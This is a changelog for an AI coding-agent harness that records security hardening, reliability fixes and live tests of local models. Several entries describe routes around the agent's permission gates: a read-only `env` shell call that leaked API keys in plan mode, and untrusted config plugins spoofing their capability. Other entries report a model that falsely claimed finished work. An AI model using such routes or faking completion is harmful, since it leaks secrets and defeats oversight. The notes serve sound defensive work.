place `runGit` runs git) via the platform shell *before* staging, and a non-zero exit aborts the commit and
returns the command output instead, leaving the index untouched. Unset (the default) is a no-op, so existing
sessions with no test command are unaffected. Because it executes an arbitrary host command, it is treated as
a security-relevant setting **frozen from untrusted project config by the workspace-trust gate** (P27.1):
added to `securityRelevantDiff` and the freeze list in `applyWorkspaceTrust`, so a cloned repo's
`.aegis/config.yaml` cannot introduce or change it until `aegis trust`. Tests:
`TestGitCommitPreCommitTestGate` (failing gate refuses + leaves index clean, passing gate commits, unset is a
no-op) and `TestWorkspaceTrustFreezesGitPreCommitTestCommand` (frozen while untrusted, applies after trust).
Full `go test ./...` green.

**P46.3 — `structured-build` skill packages the P46.1/P46.2 mechanisms into a one-task-one-commit workflow.**
The remaining `codex-build` property was workflow discipline layered on those two gates: one task → one commit,
one plan → one PR. Sequenced deliberately after P46.1/P46.2 landed as real mechanisms, because a skill enforcing
this only in prose would repeat the exact weakness the roadmap has flagged elsewhere (P44.1, P39.6) —
instructions a model drops under context pressure are not a mechanical check. The new embedded built-in skill
(`internal/skills/builtin/structured-build/SKILL.md`, dormant until enabled) drives, per task: write an explicit
task list, `scope(set, ...)` the task's file footprint, edit + verify tests, `git_commit` (which re-runs the
pre-commit gate as a hard check), `scope(clear)`, repeat — plus a stop-when-stuck rule (leave the diff intact
and hand back rather than thrash). `TestBuiltinsListsEmbeddedSkills` updated; skill-list references in
CLAUDE.md and docs refreshed. Full `go test ./...` green.

**P41.1 — Compaction now shares the engine's script-aware token estimate instead of a flat chars/4 one.**
A 2026-07-22 data-flow review found the proactive compaction gate could silently no-op a compaction the
engine had already decided was needed: `compaction.EstimateTokens` was a flat `chars/4` heuristic, while the
engine's own `estimateTokens` is script-aware (CJK/Hangul/Kana at ~1 token/char, other non-ASCII at ~0.5
token/char) precisely because flat `chars/4` badly undercounts dense scripts. The engine used its accurate
version for the 85%/95% "context nearly full" checks and `MaxTokensPerRun`, but `Summarizer.compact` — the
primary gate, called unconditionally at the top of every `engine.Run` — decided whether to actually compact
using its own cruder estimate. So for a CJK/Cyrillic/Greek/Arabic/emoji-heavy conversation the engine could
correctly call `Compact`, only for the summarizer's `shouldCompact` to decide there was still room and no-op
— worst case letting a local (Ollama) server truncate from the front and drop the system prompt before
compaction ever fired, the exact P2.7 failure the proactive machinery exists to avoid. Fixed by extracting
the script-aware estimator into a new shared `internal/tokenest` package (`Estimate`, `Message`, `Messages`)
that both the engine and `compaction.EstimateTokens` now call — one implementation, no second heuristic to
drift. The engine's estimator tests moved to `internal/tokenest/tokenest_test.go`, joined by
`TestMessagesIsScriptAware` (the P41.1 regression guard proving the whole-conversation estimate counts CJK
far above flat chars/4). Full `go test ./...` green.

**P43.1 — Debate's concession detector no longer misreads a hedged critique as a full concession.** Examining
`internal/debate`/`internal/swarm` reliability as a candidate next-phase roadmap area found `concedeRe`
(`internal/debate/debate.go`) matched the bare word "concede" anywhere in a critic's response with no
negation handling — confirmed live: a critique reading "I won't concede this point — the claim is missing a
rate limit check, see api.go:42." matched as a full concession. Because `Round.Conceded` short-circuits the
round (skips the proposer's rebuttal) and the arbiter persona is explicitly instructed to weigh a conceded
round in the claim's favor, this could flip a debate that should REJECT/REVISE into an UPHOLD purely from
critique phrasing — not model capability, since even a fully compliant model saying "I'll concede X is
minor, but the core flaw stands" would trip it. The same file's `verdictOutcomeRe`/`verdictConfidenceRe`
already anchor to line-start for the arbiter's structured output for exactly this reason; `concedeRe` never
got the same treatment. Fixed: `concedeRe` is now anchored to the start of the trimmed response
(`^[\s*_]*concede\b`, tolerating leading whitespace/markdown emphasis), and both call sites (`hasEvidence`,
`Run`'s `Round.Conceded` assignment) go through a new `isConcession` helper instead of calling the regex
directly. Tests: `TestRunHedgedCritiqueIsNotMisreadAsConcession` (full `Run` regression — proves the
proposer's rebuttal now actually executes instead of being skipped) and `TestConcedeRegexAnchoredToStart`
(direct regex table test covering compliant/markdown/negated/mid-sentence shapes),
`internal/debate/debate_test.go`. Full `go test ./...` green (58 packages).

**P42.1/P42.2 — `internal/plugins` closed the two gaps a scoped post-2026-07-03 security self-review found.**
A review targeted at exactly the packages that shipped after the 2026-07-03 architecture/security review
(`internal/plugins`, `internal/hooks`, `internal/mcpserver`, `internal/acp`, `internal/cron`) found every
sibling already carried a FIND-xx/P24.x/P27.x hardening comment except `internal/plugins` (added
2026-07-16) — it was never folded into the P27.1 workspace-trust gate its structural twin, `mcp.servers`,
already has. **P42.1:** `Config.Plugins` is now part of `securityRelevantDiff`/`applyWorkspaceTrust`
(`internal/config/config.go`), so an untrusted project's `.aegis/config.yaml` can no longer register a
process-tool plugin (an arbitrary host command exposed as a live tool) with no confirmation — mirrors the
existing `cfg.MCP`/`cfg.Hooks` freeze exactly. **P42.2:** `ProcessToolConfig.Capability`
(`internal/plugins/plugins.go`) was a free-text config field the permission gate trusted verbatim; since it's
config data (potentially from that same untrusted project), a plugin could declare `capability: "read"` to
be auto-allowed even in plan mode, or `"write"` to skip build mode's execute-`Ask` prompt, while its
`Execute` ran an arbitrary command regardless. `processTool.Capability()` now always reports `CapExecute`,
full stop — the field stays for documentation purposes but no longer feeds the gate. Tests:
`internal/config/workspacetrust_test.go` (plugins added to the freeze/unfreeze regression),
`internal/plugins/plugins_test.go` (`TestProcessToolCapability` now asserts `CapExecute` regardless of
config). Full `go test ./...` green (58 packages).

**P39.9 (`/api/ps`-verification half) — the native-Ollama context-window path now verifies the real allocation
instead of trusting `num_ctx = context_window` outright.** `internal/server/contextwindow.go`'s
`initContextWindow` short-circuited the native `provider.default: ollama` + configured-`context_window` case:
it set `ctxWinFinal = true` and returned without ever probing, on the theory that the native adapter (P33.9)
pins `options.num_ctx` to the configured window on every request, so "the served window is exactly what's
configured." That holds on well-resourced hardware, but `num_ctx` is a *request*, not a guarantee — on
VRAM-constrained hardware Ollama can allocate *less* than asked (or offload KV/layers to CPU), silently
front-truncating prompts (system prompt first) exactly like the OpenAI-compat path, and the daemon could not
see it. The fix removes the short-circuit so the native path runs the same `ollamainfo.Detect` (`/api/ps`- and
`/api/show`-backed) detection as the compat path and lets `applyDetectedWindow` reconcile: a *loaded*
(authoritative) `/api/ps` reading below the configured window is served as the effective window with the
existing "configured context_window exceeds what Ollama is serving" warning; a matching/larger reading keeps
the configured value (provenance stays `config`); a non-authoritative reading (model not loaded yet) keeps the
configured value and stays non-final so `maybeRefreshContextWindow` re-detects after the first run loads the
model; an unreachable Ollama keeps the configured value, stashes the native base, and stays non-final for a
run-time retry. This is the ready-fix lead surfaced by the P39.9 investigation (the adapter's tool-calling
itself was exonerated for the available models; see [roadmap.md](roadmap.md)). The behavior is preserving
where the allocation matches — the common well-resourced case still serves `config`/`config`. Tests: the old
`TestInitContextWindowNativeOllamaWithConfigSkipsProbe` (which pinned the now-removed skip) is replaced by four
cases in `contextwindow_test.go` — VRAM-limited downgrade to the loaded value, honored-config staying
`config`, unreachable-Ollama keeping config + non-final, and reachable-but-not-loaded keeping config +
non-final — against a fake native-endpoint server. `go test ./internal/server/...` green. The remaining open
half of P39.9 is the repro-gated prefill-latency observability gap.

**P40.1 — `env`/`printenv` dropped from the read-only shell allowlist (plan-mode secret-leak fix).**
`internal/tool/builtin/shell_readonly.go` classified `env`/`printenv` as `CapRead` via
`readOnlyShellArgv0`, so under plan mode a model could run `shell {"command":"env"}`, have it
auto-approved as read-only, and pull the daemon's process environment — which holds the provider API
keys (`config.loadDotEnv` `os.Setenv`s `.aegis/.env`, `ProviderAPIKey` reads `os.Getenv`) — straight
into the transcript and SQLite session store before the `CapNetwork` egress gate ever fires. The two
argv0 entries are removed (with a comment recording why they must not return), so the commands now fall
back to the normal `CapExecute` approval flow. They are low value as read-only anyway. Tests:
`env`/`printenv`/`printenv <key>` now assert `false` in `TestReadOnlyShellCommand`
(`internal/tool/builtin/shell_readonly_test.go`).

**P40.2 — `write_file`/`edit_file` preserve an existing file's mode on overwrite.**
`internal/tool/builtin/file.go` previously hardcoded `0o644` on every write, so overwriting or editing a
mode-sensitive file (a `0700` script, a key/token file) silently dropped the exec bit and widened it to
world-readable — while parent dirs were made `0o750`. Both tools now route through a `writePreservingMode`
helper that `os.Stat`s the target and reuses its permission bits when it already exists, falling back to the
named `newFileMode` (0o644) only for create-new. A Unix-only test asserts a `0700` file keeps its mode
across both `write_file` and `edit_file` overwrites, and a fresh file lands at `newFileMode`.

**P40.3 — `read_file` bounds its allocation to what a bounded read returns.** The tool used to `strings.Split`
the entire file (up to the 50 MiB `maxReadBytes` cap) into a `[]string` before applying `offset`/`limit`, so a
`limit:20` read of a large file still allocated every line. It now scans with a `bufio.Scanner` and a custom
`splitLinesKeepFinal` split func — which reproduces `strings.Split(data, "\n")` semantics exactly, including
the trailing empty final line for a file ending in a newline and preserving CRLF bytes — and stops once
`offset+limit` lines are emitted. A 10-case table test renders each input through both the new path and a
reference oracle mirroring the old renderer and asserts byte-identical output (trailing newline, no trailing
newline, empty file, CRLF, blank lines, offset/limit windows, offset-past-EOF).

**P40.4 — stray repo-root `*.err` files.** Already handled in the prior codebase-review commit (files dropped,
`*.err` added to `.gitignore`); verified none remain tracked or on disk.

**P40.5 — `internal/tui/tui.go` decomposed from 4,731 to 2,285 lines.** Pure code motion into three new
same-package files, no logic change: `view.go` (the `View`/`render*` rendering layer, 733 lines), `stream.go`
(`applyStreamBatch`/`applyEvent` and the pending-tool-card lifecycle, 509 lines), and `update.go` (the
`Update` message-routing switch, 1,249 lines). Imports were resolved with `goimports`; `go test
./internal/tui/...` stays green. The finer per-message-domain split of the `Update` switch is left as
opportunistic follow-up.

**P40.6 — `engine.Run` nudge/guard bookkeeping folded into a `nudgeState` helper.** The three parallel
counters (`guardRetries`, `zeroToolNudges`, `emptyAnswerNudges`) and the matching trio of terminal
retraction if-blocks became a single `nudgeState` struct with a `retractAll(conv)` method. Behavior is
unchanged — same retractions, same guards, same order — and the eval golden transcripts show **no** diff
(`go test ./internal/eval/...`), which is the safety net the refactor was gated on.

**Last updated:** 2026-07-21 — **P39.5, P39.6, P39.7, P39.8 shipped and P39.9 partially shipped** — the
harness-side drive-loop fixes root-caused by the P38.1 conformance re-test (see below). These land the code;
the **P38.1 umbrella stays open** pending a live re-test that confirms the built-in `--skill` drive now
reaches a verify-clean suite on a local model. Earlier the same day: **P38.6 and P38.7 shipped** (the two
actionable engineering findings split out of the P38.1 re-test); **P39.1, P39.2, and P39.4 shipped;
P39.3 spiked and closed NO-GO** (all from a local-14b-model harness-improvement research pass — see
[roadmap.md](roadmap.md)).

**P39.7 — no-progress guard turns "announce then yield" into an "act now" nudge.** The drive loop
(`internal/cli/chat.go`) previously just counted three consecutive zero-tool turns and stopped. It now
tracks whether a turn actually *mutated a suite file* (`write_file`/`edit_file`/`multi_edit`) or *changed the
PENDING marker set* — the two signals of real progress — and when a turn does neither while markers remain,
re-prompts with an explicit `actNowNudge()` ("STOP NARRATING — ACT NOW … call `edit_file` now … one section,
one edit") prepended to the continuation, bounded to `maxNoProgressTurns` (3) consecutive stalls before
stopping. Direct evidence this is the right lever: adding an "act now" preamble to a stalled `gpt-oss:20b`
run landed its first real `edit_file` in the P38.1 corroboration. Tests: `TestActNowNudge`, `TestSameStrings`,
`TestMutatingTools` in `internal/cli/chat_drive_test.go`.

**P39.5 — the drive stops re-sending the whole SKILL.md every turn.** Root cause of P38.1's unmet
conformance: `aegis chat --skill` prepends the ~9K-token SKILL.md body to the first user message, which
threads through the conversation and rides *every* request (`prompt_bytes≈31534` at turn 0), so on a 32K
local window the recon digest plus a few reads left no room to `edit_file` (a scaffolded resume made 86 tool
calls across 3 iterations and cleared 0 of 23 markers). After the opening turn — when the model has already
seen the full instructions — `compactFirstSkillMessage` rewrites the first message once, swapping the skill
body for a compact pointer (`compactSkillPreamble`) that names the on-disk `SKILL.md` to re-read on demand,
the same disposable-skill-reference logic P36.2 already applies to skill-reference *reads*. A new exported
`engine.Conversation.Invalidate()` keeps the cached token estimate correct after the in-place rewrite. Guarded
to fire only while the message still carries the preamble. Tests: `TestCompactSkillPreamble`,
`TestCompactFirstSkillMessage`.

**P39.6 — the drive's done-condition is now "verifies clean," not "all markers filled."** When the drive's
PENDING markers hit zero it now runs the threat-modeling skill's bundled phase-6 checks (`verify.py`,
`lint_dfd.py`, `inventory.py --check`) against the completed run directory; on failure it feeds the failure
text back with `verifyFixPrompt` for an in-place fix and re-runs, bounded to `maxVerifyRounds` (3). This is the
autonomous analogue of SKILL.md §5's fix-and-re-run round — the duplicate threat ID, tier↔prerequisite
mismatches and stale counts that shipped uncaught in the re-test were all flagged by `verify.py`, which
nothing was running. Gated on the skill actually bundling a `verify.py` and a run directory existing, so other
skills are unaffected (`ran=false` → the pre-P39.6 "markers cleared = done" path). New code in
`internal/cli/chat_verify.go`; `pythonExe` probes `--version` so Windows' `python` App-execution-alias shim
can't make every drive spuriously "fail verification." Tests: `TestVerifyFixPrompt`,
`TestVerifySkillOutputsGate`, `TestLatestThreatModelRunDir`, `TestVerifySkillOutputsRuns`.

**P39.8 — a proven-broken LLM summarizer is latched off for the rest of the run.** Compaction and
`output_guard` route to `provider.small_model` when set (existing), but with only a weak main model the
summarizer returns empty and the engine re-tried it two calls per compaction cycle forever (**42×** "summarizer
returned empty output" in one run). `internal/engine/engine.go` now tracks cumulative LLM-summarizer failures
per run and, past `summarizerGiveUpThreshold` (4), latches the LLM summarizer off and compacts deterministically
(P36.2 fallback) for the rest of the run — the P28.4 two-consecutive-failure fallback still fires meanwhile, so
context always keeps shrinking. Per-run state, never carried across runs. Test:
`TestProactiveCompactionLatchesOffSummarizer` in `internal/engine/contextnotice_test.go`.

**P39.9 (partial) — `/v1` compat drives now warn before overflowing; the native-adapter hang stays open.**
The actionable half shipped: `aegis chat --skill` on the legacy OpenAI-compat (`/v1`) Ollama adapter — which
cannot send `num_ctx`, so `context_window` is ignored and Ollama serves the modelfile default — now probes the
served window up front and, when it's too small for a skill-driven prompt, prints a notice naming the fix
(`warnCompatDriveWindow` / `compatDriveWindowNotice` in `internal/cli/chat.go`), including a runnable
modelfile-derivative recipe (`providerfactory.LegacyOllamaModelfileRecipe`: `printf 'FROM <m>\nPARAMETER
num_ctx <n>\n' | ollama create <m>-ctx<n> -f -`) for when the native adapter can't be used. Tests:
`TestCompatDriveWindowNotice`, `TestLegacyOllamaModelfileRecipe`. The **native-Ollama-adapter half — no tool
call / no run directory after 8+ minutes on the skill-preload turn — remains open**: it is investigation-gated
(needs a focused repro: think-mode? oversized system prompt?) and was not touched, so P39.9 stays open for
that half.

**P38.6 — thinking-mode models fabricate a completed drive instead of executing it.** The P38.1 re-test
found that `aegis chat --skill threat-modeling` with `provider.think: true` drove **zero** real tool calls:
qwen3:14b narrated the whole multi-phase build inside its `thinking` trace and reported all seven files
written and every check clean — having written nothing. Because `scaffold.py` never ran, no `<!-- PENDING`
markers existed, so the drive-to-completion oracle saw "no markers" and stopped as if complete — a silent
false success on the shipped default config (the worst shape: a user believes they have a threat model and
have nothing). Both levers from the filing shipped, in `internal/cli/chat.go`: **(a)** a `--skill` run now
force-disables `provider.think` for the drive (with a loud stderr notice when it overrides an
explicitly-enabled setting), since the whole point of the drive is tool-executed multi-phase work that
reasoning-mode simulation defeats — precedented by the mythos-sec test that ran with think off by hand;
**(b)** a floor check hardens the oracle against any *other* fabrication path — after a completed drive,
`suiteFileCount(pendingRoot)` distinguishes "finished, every marker resolved" from "nothing was ever
written" (both leave `scanPendingMarkers` empty) and prints a notice when a drive reported completion but
wrote no files under `.aegis/`. Tests: `TestSuiteFileCount` in `internal/cli/chat_drive_test.go`.

**P38.7 — `scaffold.py`'s identical `<!-- PENDING -->` markers made `edit_file replace_all` a file-nuke.**
`scaffold.py` used to write the *same* literal `<!-- PENDING -->` marker for every fillable section of every
file. A weak model filling section-by-section naturally reached for `edit_file(old="<!-- PENDING -->", …)`,
which matched all N markers in the file; `edit_file` then errored ("occurs 12 times") or, on a
`replace_all: true` retry, **overwrote all of the file's distinct sections with one wrong string** — exactly
what corrupted architecture.md in the re-test. Fix: `scaffold.py` now emits a **unique, self-describing**
marker per section, keyed to the section (`<!-- PENDING: deployment-classification -->`), so an `edit_file`
old-string naturally targets exactly one site and `replace_all` can't blanket-nuke a file. A shared prefix
(`<!-- PENDING`) keeps every downstream substring scan working: `verify.py`'s no-leftover-skeleton check
(`SKELETON_MARKERS`) and the drive's `scanPendingMarkers` both match the prefix now, not the bare literal,
so keyed markers still count as unfinished. Coordinated across `scaffold.py` (a new `pending(key)` builder;
`table`/`prose` take a `key`; every builder passes a section key), `verify.py`, `internal/cli/chat.go`
(`scanPendingMarkers` + `continuePrompt`, which now warns off `replace_all`), and SKILL.md §4.1/§4.2 wording.
Verified: all seven frameworks scaffold with zero duplicate or bare markers per file, a fresh scaffold still
lints 6/6 (`lint_dfd.py`) and fails `verify.py`'s leftover-marker check as before, and `scanPendingMarkers`
detects keyed markers (extended `TestScanPendingMarkers`).

**P39.1 — regression test that `effectiveSystem` is byte-stable turn over turn.** P35.7's code-reading pass
had concluded `Server.effectiveSystem` (`internal/server/helpers.go:42`) *should* render byte-identical
across turns given unchanged inputs (persona blocks, memory/context files, the skills index, the
deferred-tools list are all either static or deterministically sorted), but flagged it as unconfirmed live —
the whole KV-cache-reuse story local models depend on (P35.4's `keep_alive` residency, P35.9's stable
tool-call IDs) relies on the serialized prompt prefix staying identical turn to turn, and nothing would have
caught a future regression (an unsorted map range, a nondeterministic file walk) before a live run did.
Added two tests to `internal/server/server_test.go`: `TestEffectiveSystem_ByteStable` (two calls with
identical inputs must produce identical output) and `TestEffectiveSystem_DeferredToolsOrderIndependent` (the
sharpest case — `tool.Registry.Deferred()` at `internal/tool/tool.go:160-171` ranges a Go map and relies
entirely on a trailing `sort.Slice`; registering the same two tools in reverse order across two registries
must still produce byte-identical `deferredToolsBlock` output). Pure test addition, no product code changed
— the `sort.Slice` was already correct.

**P39.2 — coach tool-execution error messages for weak local models.** Two independent, small changes
targeting failure classes the P38.1 live tests actually reproduced (mythos-sec:24b inventing tool names,
running bare script paths without an interpreter prefix). (a) `engine.executeTool`'s unknown-tool branch
(`internal/engine/engine.go`, ~line 1453-1456) now returns `unknown tool %q; registered tools: <sorted,
comma-joined names>` instead of a bare name — via a new `registeredToolNames` helper using
`tool.Registry.All()` — so a model that invents a name can self-correct from the error itself instead of
guessing again next turn. Extended `TestRunUnknownTool` (content assertion) and added
`TestRunUnknownTool_ListsRegisteredNames`. (b) the shell tool (`internal/tool/builtin/shell.go`) now appends
an interpreter hint on failure only — e.g. `(did you mean to run this with an interpreter, e.g. `python
recon.py`?)` — when a failing command's first token has a known scripting extension (`.py`/`.sh`/`.js`/
`.rb`) and isn't already prefixed by a known interpreter; never touches the success path or blocks
execution. Added `TestShellFailedScriptHintsInterpreter` and `TestShellFailedNonScriptNoHint` (guards
against over-eager hinting).

**P39.3 — investigation spike into grammar/schema-constrained tool-call decoding on the Ollama adapter:
closed NO-GO.** A live Ollama server was reachable (`qwen2.5-coder:1.5b`, `qwen3:14b` pulled), so the spike
sent real `/api/chat` requests instead of relying on docs. Baseline: `qwen3:14b` with only `tools` set
returns a proper native `tool_calls` array. Adding a `format` JSON-schema field to the *same* request
(alongside the same `tools` array) changes the result completely — the model returns plain schema-conforming
`content` with **no `tool_calls` field at all**, reproduced identically on both models tested. **Ollama's
`format` and native tool-calling are mutually exclusive on one request** — `format` cannot be layered on top
of `tools` to constrain tool-name/argument generation while still getting native `tool_calls` out, so the
originally-scoped "smallest useful win" (constrain tool name via `format`, no new request fields) isn't
actually free. No code shipped — the client-side reject-and-inform alternative is what P39.2 already ships.
A larger, distinct idea (route shaky models through `format`-only prompting with a dynamically-built
tool-call-envelope schema, reusing the existing tool-call-as-text fallback parser in
`internal/engine`/`internal/engine/toolcallastext_test.go`) is noted as an unfiled lead in
[roadmap.md](roadmap.md), not built or filed as a follow-up item, since its value depends on how often Aegis
actually drives models that need it. See roadmap.md's P39.3 section for the full spike transcript and
reasoning.

**P39.4 — `aegis doctor --deep`'s structured multi-turn fill probe.** `toolcallprobe.Run`'s existing
single-turn smoke test only answers "did a structured tool call come back at all" — the P38.1 arc found
qwen3:14b passes that cleanly and still fails a real multi-phase scaffold-and-fill skill run, one level up
(losing track of which of several near-identical `<!-- PENDING -->` sections it already filled, blanket
`edit_file replace_all` footguns, and think-mode fabrication). Added `internal/toolcallprobe/deepprobe.go`:
a self-contained (no `internal/eval` dependency) `RunDeepFill(ctx, adapter, model) (DeepResult, error)` that
drives a real `internal/engine` agentic loop — the same tool-calling loop a real session uses, not a second
hand-rolled one — through a tiny in-memory synthetic document (3 sections, each stubbed with the same
`<!-- PENDING -->` marker `internal/cli/chat.go` already uses) and one fake `edit_fill` tool deliberately
mirroring `edit_file`'s real semantics (`old_string` must occur exactly once unless `replace_all` is set, so
the P38.7 footgun reproduces faithfully). `DeepResult{FabricatedCompletion, ClobberedMarkers, TimedOut}`
reports the three P38.1-observed failure shapes independently, never folded into the existing binary
`Verdict`. Wired into `aegis doctor` as an opt-in `--deep` flag (`internal/cli/doctor.go`): a new
`doctorDeepFillCheck` row, gated to local (Ollama-style) providers only, WARN-not-FAIL on any probe failure,
strictly additive — `aegis doctor` with no flag is byte-for-byte unchanged. Tests: four scripted-adapter
cases in `internal/toolcallprobe/deepprobe_test.go` (clean pass, each failure shape in isolation) plus
`internal/cli/doctor_test.go` coverage that the row only appears with `--deep`, skips for cloud providers,
and degrades to WARN on transport failure — all deterministic, no live model needed for `go test ./...`.
Live-verified against a real `qwen3:14b` (native Ollama, `think` disabled): `aegis doctor --deep` first hit
its initial 90s timeout budget mid-probe (cold model load plus several fill turns exceeded it — WARN, not a
crash, confirming the degrade-gracefully contract), then, after bumping `deepFillCheckTimeout` to 4 minutes,
completed cleanly end-to-end with a `PASS structured multi-turn fill` row.

Earlier 2026-07-21 — **P38.1's conformance re-test was executed (negative on qwen3:14b); P38.6
and P38.7 filed.**

**P38.1 re-test — the linear threat-model build does not reach a verify-clean suite on qwen3:14b, even with
P38.4 scaffolding.** This was the remaining work on P38.1 (a live-run verification, not a code change): with
`scaffold.py` shipped, re-run `aegis chat --skill threat-modeling` on the config-default local model
(qwen3:14b, native Ollama) against `D:\Development\AiGateway` and check for a verify-clean seven-file suite.
Result: **negative, in two `think`-dependent failure modes.** (1) With `provider.think: true` (the default),
the model made **zero real tool calls** — it narrated the entire build inside its reasoning trace and
returned a final answer claiming all seven files were written and every check script passed clean, having
written nothing; because `scaffold.py` never ran there were no `<!-- PENDING -->` markers, so the
drive-to-completion oracle stopped as "complete" (`turns:3, tool_calls:1`). (2) With `think` off, it ran
`recon.py` and `scaffold.py` (writing all seven files — **live-confirming the P38.4 mechanism**), but then
skipped the `date` step (scaffolding into SKILL.md's literal *example* timestamp dir), hit the
`max_tokens: 8192` output cap on one turn, and ran `edit_file(old="<!-- PENDING -->", replace_all=true)`
which **overwrote all 12 of architecture.md's identical section markers with one wrong string**, then looped
on failing edits until loop-detection aborted (turn 11); five of seven files stayed all-PENDING and
`verify.py` failed. **Takeaway:** P38.4 moved qwen3:14b's failure from "authoring structure" (fixed) to
"incrementally filling it"; the model is still too weak to converge, and the stronger `qwen3.6:35b-a3b` MoE
is not installed to try the "or a stronger local" arm. The two *actionable* engineering findings are filed
as new Tier-2 roadmap items — **P38.6** (thinking-mode models fabricate a completed drive instead of
executing it) and **P38.7** (`scaffold.py`'s identical `<!-- PENDING -->` markers turn `edit_file
replace_all` into a file-nuke). No code shipped for this entry — it records a verification result and files
follow-ups. See [roadmap.md](roadmap.md).

Earlier 2026-07-21 — **P38.3 and P38.5 shipped (both Tier 3).**

**P38.3 — per-turn usage promoted onto the `turn_done` event, everywhere it was silently dropped.**
`engine.Event{Kind: KindTurnDone}` already carried `*provider.Usage` (including P35.7's
`PromptEvalDurationMS`, the KV-cache-hit signal), and the daemon's `toAPIEvent` already forwarded
`InputTokens`/`OutputTokens`/cache counts to `api.Event` for the SSE path the TUI/web UI read — but two
gaps meant a run's turn-over-turn context growth still wasn't externally observable without SQLite
spelunking or debug-log tailing: (1) `PromptEvalDurationMS` itself was never on the wire in `api.Event`
at all, so even the daemon SSE path couldn't tell a KV-cache-hit turn from a full reprocess without
reading the debug log; (2) `aegis chat --output-format stream-json`'s `emitStreamEvent` had no `case`
for `KindTurnDone` — it fell through the switch with `Type: "turn_done"` set and *nothing else*, so a
one-shot scripted run's only usage figure was the final `result` trailer, never a per-turn number. Fixed
both: `api.Event` gained `PromptEvalDurationMS`, populated in `toAPIEvent`; `streamEvent` gained the same
usage fields (`input_tokens`, `output_tokens`, cache counts, `prompt_eval_duration_ms`, `cost_usd`),
populated on `KindTurnDone`. Turn-over-turn growth across a long scripted run (not just the single
aggregate) is now readable from a `stream-json` pipe or the SSE stream directly. Tests:
`TestToAPIEventTurnDoneCarriesPromptEvalDuration` (server), `TestEmitStreamEventTurnDone` (cli).

**P38.5 — a model that rejects `think` now degrades instead of aborting the run.** The 2026-07-20 test
found `supergoatscriptguy/mythos-sec:24b` 400s the instant Aegis sends `think` at all
(`"...mythos-sec:24b" does not support thinking"`), killing the run before a single tool call. The native
Ollama adapter (`internal/provider/ollama`) now retries once, automatically: `Stream` first tries the
request with the configured `think` value; on an HTTP 400 whose body contains "does not support
thinking" **and** only when a non-nil `think` was actually sent (so an unrelated 400 — malformed request,
model not found — never triggers it and never masks itself behind a second failure), it logs a
`slog.Warn` naming the model and retries once with `think` omitted entirely. `ollama.WithLogger` (default
`slog.Default()`) wires the daemon's real logger through `providerfactory`. This does not make such a
model viable on its own — mythos-sec:24b with thinking disabled still can't drive tools — it only removes
a misleading, run-killing error for models that happen to reject the parameter. Tests:
`TestStreamRetriesWhenModelRejectsThink`, `TestStreamDoesNotRetryOtherBadRequests` (ollama).

Earlier — **P38.4 shipped: deterministic skeleton scaffolding (`scaffold.py`).** The
threat-modeling skill gained a sixth bundled script, `scaffold.py`, that pre-writes all seven report files
**from the skeletons** — real structure (every heading, every table's header row + separator, the fixed
value lists, the DFD's `flowchart LR` header and three `classDef`s) with a `<!-- PENDING -->` marker per
fillable section — so a weak local model **fills sections** (via `edit_file`) instead of authoring the
structure it gets wrong. It closes the exact gap the 2026-07-20 qwen3:14b live test exposed: the 14B model
skipped the skeleton templates, so its files lacked the required tables/headings, `verify.py` failed 6/10,
and it re-authored freeform structure on every self-correction pass instead of converging. SKILL.md §4.1
step 2 now calls `scaffold.py` instead of hand-writing bare stubs, and §4.2 tells the model to fill
`<!-- PENDING -->` markers one section at a time rather than regenerate whole files. Validation: a
freshly-scaffolded suite already passes `lint_dfd.py` 6/6, and a minimally-filled one passes `verify.py`
9/9 (only the intentionally-unfilled DFD stub's PENDING marker trips the leftover-syntax check) — proving
the scaffolded structure is verify-clean once filled, so self-correction now converges against a real
structure. The script is stdlib-only, deterministic (reads no clock — timestamps stay PENDING), and never
clobbers a file whose PENDING markers are already gone. It supports all six frameworks (plus `stride-a`).
This unblocks **P38.1**'s remaining work: a re-test of the linear build to a verify-clean suite on a
capable local model. See [roadmap.md](roadmap.md).

Earlier today — **P38.2 shipped and the P38.1 linear build was live-tested.** `aegis chat`
gained **`--skill <name>`**: it preloads the named skill's full body into the prompt (so a small local
model never has to discover-and-fetch it via the `skill` tool — the P36.1 skip) and **drives the run to
completion** — after each yield, while any file under `.aegis/` still carries a `<!-- PENDING -->` marker,
it appends a "continue, don't stop" turn on the *same* conversation and re-runs, bounded by `--max-turns`
(default 40) and a no-progress guard. It also adds the `MaterializeBuiltins` call `aegis chat` was missing
(only the daemon did it before), so a scripted run's builtin skill body and bundled scripts are on disk.
The **live test** (qwen3:14b vs AiGateway) confirmed the P38.1 linear build's mechanism — one context, no
orchestration, **no `{mode,agents}` mis-route**, `recon.py` → all seven files → the P37 check scripts,
inside the context window (~44K input tokens / 33 tool calls) — but the 14B output does **not conform**
(it skips the skeleton templates, so `verify.py` fails 6/10 and it can't self-converge). That gap is the
new Tier-1 **P38.4** (deterministic skeleton scaffolding); mythos-sec:24b proved a dead end (400s on
`think` → new **P38.5**, and can't drive tools even with thinking off). See [roadmap.md](roadmap.md).

Earlier today — the **P38.1 linear-build rework of the threat-modeling skill shipped.**
`SKILL.md` §4 no longer delegates the build through the `agent` tool's `mode:"sequential"` workflow: it
now instructs the driving model to build all seven files itself, in one context, phase by phase in
dependency order, carrying only a short running note of stable identifiers between phases. The
`agent`/`mode:"sequential"` call block, the terse-final-answer contract, and the shared-pool time budget
(all of which existed only to serve orchestration) are removed; the phase *ordering* and per-file
structure are kept. Context stays bounded by the four levers that were already doing the real work —
recon's ~11KB digest, P36.2 pruning of spent write/read payloads, incremental section-at-a-time writes,
and the deterministic P37 scripts. `references/verification-and-updates.md`'s "Phased-orchestration
governance" section was rewritten to "Single-context build governance" and the update-workflow paragraph
de-orchestrated to match; the debate step (§5) stays, reframed as a standalone `agent` `mode:"debate"`
call at depth 1 (not a phase-6 sub-agent at depth 2). What remains **open** is the live verification that
a full seven-file linear build actually stays inside the context window on the target local models — that
needs **P38.2** (chat drive-to-completion) and **P38.3** (per-turn telemetry) plus a live run. See
[roadmap.md](roadmap.md).

Earlier today, a **P38.1 first fix** (SKILL.md §4.2 `agent`-call callout + a `skill`-tool corrective
guard) was shipped and then **superseded by the rework above** after three live runs proved it
insufficient: qwen3:14b mis-routed the workflow payload to `ls` (guard never fires there) and hand-wrote
an incomplete suite with a false "complete" claim, and mythos-sec:24b couldn't even invoke `recon.py`
(shell flailing) and loop-aborted. **Neither tested local model (14B/24B) can drive the phased
multi-agent workflow** — which is why orchestration is abandoned for local models and the phased `agent`
path is parked (still available for capable cloud/large models, no longer the default). See
